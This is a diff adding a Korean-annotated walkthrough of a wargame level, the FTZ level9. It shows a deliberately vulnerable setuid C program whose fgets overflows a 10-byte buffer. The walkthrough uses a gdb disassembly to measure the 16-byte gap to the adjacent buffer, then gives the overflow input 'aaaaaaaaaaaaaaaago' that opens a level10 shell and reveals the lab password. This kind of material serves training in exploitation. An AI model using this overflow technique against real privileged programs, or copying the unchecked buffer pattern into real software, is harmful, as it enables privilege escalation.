@@ -1,0 +1,116 @@
+login as: level9
+level9@192.168.35.100's password:
+[level9@ftz level9]$ ll
+total 12
+-rw-r--r--    1 root     root          391 Nov 13  2002 hint
+drwxr-xr-x    2 root     level9       4096 Feb 24  2002 public_html
+drwxrwxr-x    2 root     level9       4096 Dec 21 16:34 tmp
+[level9@ftz level9]$ cat hint
+
+
+다음은 /usr/bin/bof의 소스이다.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+main(){
+
+  char buf2[10];
+  char buf[10];
+
+  printf("It can be overflow : ");
+  fgets(buf,40,stdin);	### buf에 40 이하의 문자를 입력받고 넘으면 buf2에 저장된다
+
+  if ( strncmp(buf2, "go", 2) == 0 )	### buf2의 앞의 2개의 문자와 “go”와 같으면 0 리턴
+   {
+        printf("Good Skill!\n");
+        setreuid( 3010, 3010 );
+        system("/bin/bash");
+   }
+
+}
+
+이를 이용하여 level10의 권한을 얻어라.
+
+[level9@ftz level9]$ cat /tmp/level9.c		### level9.c 파일 생성
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+main(){
+        char buf2[10];
+        char buf[10];
+
+
+        printf("It can be overflow : ");
+        fgets(buf,40,stdin);
+
+        if(strncmp(buf2,"go",2)==0){
+                printf("Good Skill!\n");
+                setreuid(3010,3010);
+                system("/bin/bash");
+        }
+}
+### 위의 힌트 파일과 똑같이 작성해준다고 컴파일해준다
+
+[level9@ftz level9]$ gcc -o /tmp/level9 /tmp/level9.c
+[level9@ftz level9]$ gdb -q /tmp/level9	
+### 원래는 10개의 문자를 buf에 받고 바로 buf2에 넘겨야하지만, 두 배열 사이에는 빈 공간이 있어서 빈공간을 조사하려 디버깅을 해본다.
+
+(gdb) set disas intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048420 <main+0>:    push   ebp
+0x08048421 <main+1>:    mov    ebp,esp
+0x08048423 <main+3>:    sub    esp,0x28
+0x08048426 <main+6>:    and    esp,0xfffffff0
+0x08048429 <main+9>:    mov    eax,0x0
+0x0804842e <main+14>:   sub    esp,eax
+0x08048430 <main+16>:   sub    esp,0xc
+0x08048433 <main+19>:   push   0x8048554
+0x08048438 <main+24>:   call   0x8048350 <printf>
+0x0804843d <main+29>:   add    esp,0x10
+0x08048440 <main+32>:   sub    esp,0x4
+0x08048443 <main+35>:   push   ds:0x8049698
+0x08048449 <main+41>:   push   0x28
+0x0804844b <main+43>:   lea    eax,[ebp-40]	### ebp-40: buf 위치
+0x0804844e <main+46>:   push   eax
+0x0804844f <main+47>:   call   0x8048320 <fgets>
+0x08048454 <main+52>:   add    esp,0x10
+0x08048457 <main+55>:   sub    esp,0x4
+0x0804845a <main+58>:   push   0x2
+0x0804845c <main+60>:   push   0x804856a
+0x08048461 <main+65>:   lea    eax,[ebp-24]	# ebp-24: buf2 위치
+0x08048464 <main+68>:   push   eax
+0x08048465 <main+69>:   call   0x8048330 <strncmp>
+0x0804846a <main+74>:   add    esp,0x10
+0x0804846d <main+77>:   test   eax,eax
+0x0804846f <main+79>:   jne    0x80484a6 <main+134>
+0x08048471 <main+81>:   sub    esp,0xc
+0x08048474 <main+84>:   push   0x804856d
+0x08048479 <main+89>:   call   0x8048350 <printf>
+0x0804847e <main+94>:   add    esp,0x10
+0x08048481 <main+97>:   sub    esp,0x8
+0x08048484 <main+100>:  push   0xbc2
+0x08048489 <main+105>:  push   0xbc2
+0x0804848e <main+110>:  call   0x8048360 <setreuid>
+0x08048493 <main+115>:  add    esp,0x10
+0x08048496 <main+118>:  sub    esp,0xc
+0x08048499 <main+121>:  push   0x804857a
+0x0804849e <main+126>:  call   0x8048310 <system>
+0x080484a3 <main+131>:  add    esp,0x10
+0x080484a6 <main+134>:  leave
+0x080484a7 <main+135>:  ret
+End of assembler dump.
+(gdb) q		### 디버깅 종료
+
+### buf와 buf2 사이에 16만큼의 차가 있으므로 a를16만큼 써준다음 go를 입력한다
+[level9@ftz level9]$ bof
+It can be overflow : aaaaaaaaaaaaaaaago
+Good Skill!	# bash 획득~
+[level10@ftz level9]$ my-pass
+
+Level10 Password is "interesting to hack!".
+
+[level10@ftz level9]$
